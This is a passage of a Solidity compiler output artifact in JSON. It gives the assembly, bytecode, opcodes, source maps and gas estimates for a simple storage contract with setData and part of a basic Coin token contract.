						"assembly": "    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3043:3346  contract C {\r... */\n  mstore(0x40, 0x80)\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3043:3346  contract C {\r... */\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3043:3346  contract C {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_1:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3043:3346  contract C {\r... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x5b4b73a9\n      eq\n      tag_3\n      jumpi\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3154:3199  function setData(uint a) public { data = a; } */\n    tag_3:\n      tag_4\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":15:17   */\n      0x20\n        /* \"--CODEGEN--\":10:13   */\n      dup2\n        /* \"--CODEGEN--\":7:18   */\n      lt\n        /* \"--CODEGEN--\":4:6   */\n      iszero\n      tag_5\n      jumpi\n        /* \"--CODEGEN--\":31:32   */\n      0x00\n        /* \"--CODEGEN--\":28:29   */\n      dup1\n        /* \"--CODEGEN--\":21:33   */\n      revert\n        /* \"--CODEGEN--\":4:6   */\n    tag_5:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3154:3199  function setData(uint a) public { data = a; } */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_6\n      jump\t// in\n    tag_4:\n      stop\n    tag_6:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3195:3196  a */\n      dup1\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3188:3192  data */\n      0x00\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3188:3196  data = a */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3154:3199  function setData(uint a) public { data = a; } */\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220869c8ee1b931259182e8982ae9318373912a5d3261210046cc5676ceafac5d0764736f6c63430006060033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "6080604052348015600f57600080fd5b5060988061001e6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c80635b4b73a914602d575b600080fd5b605660048036036020811015604157600080fd5b81019080803590602001909291905050506058565b005b806000819055505056fea2646970667358221220869c8ee1b931259182e8982ae9318373912a5d3261210046cc5676ceafac5d0764736f6c63430006060033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x98 DUP1 PUSH2 0x1E PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x28 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x5B4B73A9 EQ PUSH1 0x2D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x56 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH1 0x41 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x58 JUMP JUMPDEST STOP JUMPDEST DUP1 PUSH1 0x0 DUP2 SWAP1 SSTORE POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP7 SWAP13 DUP15 0xE1 0xB9 BALANCE 0x25 SWAP2 DUP3 0xE8 SWAP9 0x2A 0xE9 BALANCE DUP4 PUSH20 0x912A5D3261210046CC5676CEAFAC5D0764736F6C PUSH4 0x43000606 STOP CALLER ",
							"sourceMap": "3043:303:4:-:0;;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;3043:303:4;;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "6080604052348015600f57600080fd5b506004361060285760003560e01c80635b4b73a914602d575b600080fd5b605660048036036020811015604157600080fd5b81019080803590602001909291905050506058565b005b806000819055505056fea2646970667358221220869c8ee1b931259182e8982ae9318373912a5d3261210046cc5676ceafac5d0764736f6c63430006060033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x28 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x5B4B73A9 EQ PUSH1 0x2D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x56 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH1 0x41 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x58 JUMP JUMPDEST STOP JUMPDEST DUP1 PUSH1 0x0 DUP2 SWAP1 SSTORE POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP7 SWAP13 DUP15 0xE1 0xB9 BALANCE 0x25 SWAP2 DUP3 0xE8 SWAP9 0x2A 0xE9 BALANCE DUP4 PUSH20 0x912A5D3261210046CC5676CEAFAC5D0764736F6C PUSH4 0x43000606 STOP CALLER ",
							"sourceMap": "3043:303:4:-:0;;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;3043:303:4;;;;;;;;;;;;;;;;12:1:-1;9;2:12;3154:45:4;;;;;;15:2:-1;10:3;7:11;4:2;;;31:1;28;21:12;4:2;3154:45:4;;;;;;;;;;;;;;;;;:::i;:::-;;;3195:1;3188:4;:8;;;;3154:45;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "30400",
								"executionCost": "81",
								"totalCost": "30481"
							},
							"external": {
								"setData(uint256)": "20220"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 3043,
									"end": 3346,
									"name": "PUSH",
									"source": 4,
									"value": "80"
								},
								{
									"begin": 3043,
									"end": 3346,
									"name": "PUSH",
									"source": 4,
									"value": "40"
								},
								{
									"begin": 3043,
									"end": 3346,
									"name": "MSTORE",
									"source": 4
								},
								{
									"begin": 3043,
									"end": 3346,
									"name": "CALLVALUE",
									"source": 4
								},
								{
									"begin": 5,
									"end": 14,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 27,
									"end": 28,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 24,
									"end": 25,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 17,
									"end": 29,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "tag",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 3043,
									"end": 3346,
									"name": "POP",
									"source": 4
								},
								{
									"begin": 3043,
									"end": 3346,
									"name": "PUSH #[$]",
									"source": 4,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 3043,
									"end": 3346,
									"name": "DUP1",
									"source": 4
								},
								{
									"begin": 3043,
									"end": 3346,
									"name": "PUSH [$]",
									"source": 4,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 3043,
									"end": 3346,
									"name": "PUSH",
									"source": 4,
									"value": "0"
								},
								{
									"begin": 3043,
									"end": 3346,
									"name": "CODECOPY",
									"source": 4
								},
								{
									"begin": 3043,
									"end": 3346,
									"name": "PUSH",
									"source": 4,
									"value": "0"
								},
								{
									"begin": 3043,
									"end": 3346,
									"name": "RETURN",
									"source": 4
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220869c8ee1b931259182e8982ae9318373912a5d3261210046cc5676ceafac5d0764736f6c63430006060033",
									".code": [
										{
											"begin": 3043,
											"end": 3346,
											"name": "PUSH",
											"source": 4,
											"value": "80"
										},
										{
											"begin": 3043,
											"end": 3346,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 3043,
											"end": 3346,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 3043,
											"end": 3346,
											"name": "CALLVALUE",
											"source": 4
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 3043,
											"end": 3346,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 3043,
											"end": 3346,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 3043,
											"end": 3346,
											"name": "CALLDATASIZE",
											"source": 4
										},
										{
											"begin": 3043,
											"end": 3346,
											"name": "LT",
											"source": 4
										},
										{
											"begin": 3043,
											"end": 3346,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "2"
										},
										{
											"begin": 3043,
											"end": 3346,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 3043,
											"end": 3346,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 3043,
											"end": 3346,
											"name": "CALLDATALOAD",
											"source": 4
										},
										{
											"begin": 3043,
											"end": 3346,
											"name": "PUSH",
											"source": 4,
											"value": "E0"
										},
										{
											"begin": 3043,
											"end": 3346,
											"name": "SHR",
											"source": 4
										},
										{
											"begin": 3043,
											"end": 3346,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 3043,
											"end": 3346,
											"name": "PUSH",
											"source": 4,
											"value": "5B4B73A9"
										},
										{
											"begin": 3043,
											"end": 3346,
											"name": "EQ",
											"source": 4
										},
										{
											"begin": 3043,
											"end": 3346,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 3043,
											"end": 3346,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 3043,
											"end": 3346,
											"name": "tag",
											"source": 4,
											"value": "2"
										},
										{
											"begin": 3043,
											"end": 3346,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 12,
											"end": 13,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 9,
											"end": 10,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 14,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "tag",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "CALLDATASIZE",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 15,
											"end": 17,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 10,
											"end": 13,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 7,
											"end": 18,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "5"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 31,
											"end": 32,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 28,
											"end": 29,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 21,
											"end": 33,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "tag",
											"source": -1,
											"value": "5"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "CALLDATALOAD",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "6"
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "JUMP",
											"source": 4,
											"value": "[in]"
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "tag",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "STOP",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "tag",
											"source": 4,
											"value": "6"
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 3195,
											"end": 3196,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 3188,
											"end": 3192,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 3188,
											"end": 3196,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 3188,
											"end": 3196,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 3188,
											"end": 3196,
											"name": "SSTORE",
											"source": 4
										},
										{
											"begin": 3188,
											"end": 3196,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "JUMP",
											"source": 4,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"setData(uint256)": "5b4b73a9"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"a\",\"type\":\"uint256\"}],\"name\":\"setData\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":\"C\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":{\"keccak256\":\"0x7325d748c6c1e37fc30fcac062da88b793324299391319dbdfe1b64f7e1b94cb\",\"urls\":[\"bzz-raw://9f696e0559a5cf2d269690bc6b5575b8bd3047e5632936b44d891a9621510877\",\"dweb:/ipfs/QmU6ZzNqnNRVLV1yP7xtw5DYP14BVDHu8R9umT6fefBQ5q\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 1764,
								"contract": "https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC:C",
								"label": "data",
								"offset": 0,
								"slot": "0",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				},
				"Coin": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "Sent",
							"type": "event"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "balances",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "minter",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":787:2572  contract Coin {\r... */\n  mstore(0x40, 0x80)\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":787:2572  contract Coin {\r... */\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":787:2572  contract Coin {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_1:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":787:2572  contract Coin {\r... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x07546172\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x27e235e3\n      eq\n      tag_4\n      jumpi\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":1207:1228  address public minter */\n    tag_3:\n      tag_5\n      tag_6\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":1235:1276  mapping (address => uint) public balances */\n    tag_4:\n      tag_7\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":15:17   */\n      0x20\n        /* \"--CODEGEN--\":10:13   */\n      dup2\n        /* \"--CODEGEN--\":7:18   */\n      lt\n        /* \"--CODEGEN--\":4:6   */\n      iszero\n      tag_8\n      jumpi\n        /* \"--CODEGEN--\":31:32   */\n      0x00\n        /* \"--CODEGEN--\":28:29   */\n      dup1\n        /* \"--CODEGEN--\":21:33   */\n      revert\n        /* \"--CODEGEN--\":4:6   */\n    tag_8:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":1235:1276  mapping (address => uint) public balances */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_9\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":1207:1228  address public minter */\n    tag_6:\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":1235:1276  mapping (address => uint) public balances */\n    tag_9:\n      mstore(0x20, 0x01)\n      dup1\n      0x00\n      mstore\n      keccak256(0x00, 0x40)\n      0x00\n      swap2\n      pop\n      swap1\n      pop\n      sload\n      dup2\n      jump\t// out\n\n    auxdata: 0xa26469706673582212200e14796961973e630439d54f5d8bcb7ede96b9ef0acdbf57d741af6b4522575764736f6c63430006060033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50610150806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c8063075461721461003b57806327e235e314610085575b600080fd5b6100436100dd565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6100c76004803603602081101561009b57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610102565b6040518082815260200191505060405180910390f35b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6001602052806000526040600020600091509050548156fea26469706673582212200e14796961973e630439d54f5d8bcb7ede96b9ef0acdbf57d741af6b4522575764736f6c63430006060033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x150 DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x7546172 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0x27E235E3 EQ PUSH2 0x85 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x43 PUSH2 0xDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xC7 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x9B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x102 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x20 MSTORE DUP1 PUSH1 0x0 MSTORE PUSH1 0x40 PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP2 POP SWAP1 POP SLOAD DUP2 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xE EQ PUSH26 0x6961973E630439D54F5D8BCB7EDE96B9EF0ACDBF57D741AF6B45 0x22 JUMPI JUMPI PUSH5 0x736F6C6343 STOP MOD MOD STOP CALLER ",
							"sourceMap": "787:1785:4:-:0;;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;787:1785:4;;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
